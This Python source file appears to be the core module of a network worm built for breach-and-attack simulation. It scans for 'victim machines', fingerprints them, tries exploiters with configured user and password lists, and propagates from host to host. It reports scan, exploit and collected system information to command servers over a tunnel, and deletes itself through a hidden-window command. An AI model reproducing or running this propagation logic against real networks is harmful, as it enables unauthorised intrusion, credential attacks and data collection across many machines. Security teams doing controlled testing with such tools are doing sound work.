import sys
import os
import time
import logging
import tunnel
import argparse
import subprocess
from system_singleton import SystemSingleton
from network.firewall import app as firewall
from control import ControlClient
from config import WormConfiguration
from network.network_scanner import NetworkScanner
from model import DELAY_DELETE_CMD
from system_info import SystemInfoCollector

__author__ = 'itamar'

LOG = logging.getLogger(__name__)


class ChaosMonkey(object):
    def __init__(self, args):
        self._keep_running = False
        self._exploited_machines = set()
        self._fail_exploitation_machines = set()
        self._singleton = SystemSingleton()
        self._parent = None
        self._default_tunnel = None
        self._args = args
        self._network = None
        self._dropper_path = None
        self._exploiters = None
        self._fingerprint = None
        self._default_server = None
        self._depth = 0

    def initialize(self):
        LOG.info("Monkey is initializing...")

        if not self._singleton.try_lock():
            raise Exception("Another instance of the monkey is already running")

        arg_parser = argparse.ArgumentParser()
        arg_parser.add_argument('-p', '--parent')
        arg_parser.add_argument('-t', '--tunnel')
        arg_parser.add_argument('-s', '--server')
        arg_parser.add_argument('-d', '--depth')
        opts, self._args = arg_parser.parse_known_args(self._args)

        self._parent = opts.parent
        self._default_tunnel = opts.tunnel
        self._default_server = opts.server
        if opts.depth:
            WormConfiguration.depth = int(opts.depth)
            WormConfiguration._depth_from_commandline = True
        self._keep_running = True
        self._network = NetworkScanner()
        self._dropper_path = sys.argv[0]

        if self._default_server:
            if self._default_server not in WormConfiguration.command_servers:
                LOG.debug("Added default server: %s" % self._default_server)
                WormConfiguration.command_servers.insert(0, self._default_server)
            else:
                LOG.debug("Default server: %s is already in command servers list" % self._default_server)

    def start(self):
        LOG.info("Monkey is running...")

        if firewall.is_enabled():
            firewall.add_firewall_rule()
        ControlClient.wakeup(parent=self._parent, default_tunnel=self._default_tunnel)
        ControlClient.load_control_config()

        if not WormConfiguration.alive:
            LOG.info("Marked not alive from configuration")
            return

        monkey_tunnel = ControlClient.create_control_tunnel()
        if monkey_tunnel:
            monkey_tunnel.start()

        last_exploit_time = None

        ControlClient.send_telemetry("state", {'done': False})

        self._default_server = WormConfiguration.current_server
        LOG.debug("default server: %s" % self._default_server)
        ControlClient.send_telemetry("tunnel", {'proxy': ControlClient.proxies.get('https')})

        if WormConfiguration.collect_system_info:
            LOG.debug("Calling system info collection")
            system_info_collector = SystemInfoCollector()
            system_info = system_info_collector.get_info()
            ControlClient.send_telemetry("system_info_collection", system_info)

        if 0 == WormConfiguration.depth:
            LOG.debug("Reached max depth, shutting down")
            ControlClient.send_telemetry("trace", "Reached max depth, shutting down")
            return
        else:
            LOG.debug("Running with depth: %d" % WormConfiguration.depth)

        for _ in xrange(WormConfiguration.max_iterations):
            ControlClient.keepalive()
            ControlClient.load_control_config()

            LOG.debug("Users to try: %s" % str(WormConfiguration.exploit_user_list))
            LOG.debug("Passwords to try: %s" % str(WormConfiguration.exploit_password_list))

            self._network.initialize()

            self._exploiters = [exploiter() for exploiter in WormConfiguration.exploiter_classes]

            self._fingerprint = [fingerprint() for fingerprint in WormConfiguration.finger_classes]

            if not self._keep_running or not WormConfiguration.alive:
                break

            machines = self._network.get_victim_machines(WormConfiguration.scanner_class,
                                                         max_find=WormConfiguration.victims_max_find,
                                                         stop_callback=ControlClient.check_for_stop)
            is_empty = True
            for machine in machines:
                if ControlClient.check_for_stop():
                    break

                is_empty = False
                for finger in self._fingerprint:
                    LOG.info("Trying to get OS fingerprint from %r with module %s",
                             machine, finger.__class__.__name__)
                    finger.get_host_fingerprint(machine)

                ControlClient.send_telemetry('scan', {'machine': machine.as_dict(),
                                                      'scanner': WormConfiguration.scanner_class.__name__})

                # skip machines that we've already exploited
                if machine in self._exploited_machines:
                    LOG.debug("Skipping %r - already exploited",
                              machine)
                    continue
                elif machine in self._fail_exploitation_machines:
                    if WormConfiguration.retry_failed_explotation:
                        LOG.debug("%r - exploitation failed before, trying again", machine)
                    else:
                        LOG.debug("Skipping %r - exploitation failed before", machine)
                        continue


                if monkey_tunnel:
                    monkey_tunnel.set_tunnel_for_host(machine)
                if self._default_server:
                    LOG.debug("Default server: %s set to machine: %r" % (self._default_server, machine))
                    machine.set_default_server(self._default_server)

                successful_exploiter = None
                for exploiter in self._exploiters:
                    if not exploiter.is_os_supported(machine):
                        LOG.info("Skipping exploiter %s host:%r, os is not supported",
                                 exploiter.__class__.__name__, machine)
                        continue

                    LOG.info("Trying to exploit %r with exploiter %s...", machine, exploiter.__class__.__name__)

                    try:
                        if exploiter.exploit_host(machine, WormConfiguration.depth):
                            successful_exploiter = exploiter
                            break
                        else:
                            LOG.info("Failed exploiting %r with exploiter %s", machine, exploiter.__class__.__name__)
                            ControlClient.send_telemetry('exploit', {'result': False, 'machine': machine.__dict__,
                                                                     'exploiter': exploiter.__class__.__name__})

                    except Exception as exc:
                        LOG.error("Exception while attacking %s using %s: %s",
                                  machine, exploiter.__class__.__name__, exc)
                        ControlClient.send_telemetry('exploit', {'result': False, 'machine': machine.__dict__,
                                                                 'exploiter': exploiter.__class__.__name__})
                        continue

                if successful_exploiter:
                    self._exploited_machines.add(machine)
                    last_exploit_time = time.time()
                    ControlClient.send_telemetry('exploit', {'result': True, 'machine': machine.__dict__,
                                                             'exploiter': successful_exploiter.__class__.__name__})

                    LOG.info("Successfully propagated to %s using %s",
                             machine, successful_exploiter.__class__.__name__)

                    # check if max-exploitation limit is reached
                    if WormConfiguration.victims_max_exploit <= len(self._exploited_machines):
                        self._keep_running = False

                        LOG.info("Max exploited victims reached (%d)", WormConfiguration.victims_max_exploit)
                        break
                else:
                    self._fail_exploitation_machines.add(machine)

            if not is_empty:
                time.sleep(WormConfiguration.timeout_between_iterations)

        if self._keep_running and WormConfiguration.alive:
            LOG.info("Reached max iterations (%d)", WormConfiguration.max_iterations)
        elif not WormConfiguration.alive:
            LOG.info("Marked not alive from configuration")

        # if host was exploited, before continue to closing the tunnel ensure the exploited host had its chance to
        # connect to the tunnel
        if last_exploit_time and (time.time() - last_exploit_time < 60):
            time.sleep(time.time() - last_exploit_time)

        if monkey_tunnel:
            monkey_tunnel.stop()
            monkey_tunnel.join()

    def cleanup(self):
        LOG.info("Monkey cleanup started")
        self._keep_running = False

        # Signal the server (before closing the tunnel)
        ControlClient.send_telemetry("state", {'done': True})

        # Close tunnel
        tunnel_address = ControlClient.proxies.get('https', '').replace('https://', '').split(':')[0]
        if tunnel_address:
            LOG.info("Quitting tunnel %s", tunnel_address)
            tunnel.quit_tunnel(tunnel_address)

        firewall.close()

        self._singleton.unlock()

        if WormConfiguration.self_delete_in_cleanup and -1 == sys.executable.find('python'):
            try:
                if "win32" == sys.platform:
                    from _subprocess import SW_HIDE, STARTF_USESHOWWINDOW, CREATE_NEW_CONSOLE
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags = CREATE_NEW_CONSOLE | STARTF_USESHOWWINDOW
                    startupinfo.wShowWindow = SW_HIDE
                    subprocess.Popen(DELAY_DELETE_CMD % {'file_path': sys.executable},
                                     stdin=None, stdout=None, stderr=None,
                                     close_fds=True, startupinfo=startupinfo)
                else:
                    os.remove(sys.executable)
            except Exception, exc:
                LOG.error("Exception in self delete: %s", exc)

        LOG.info("Monkey is shutting down")
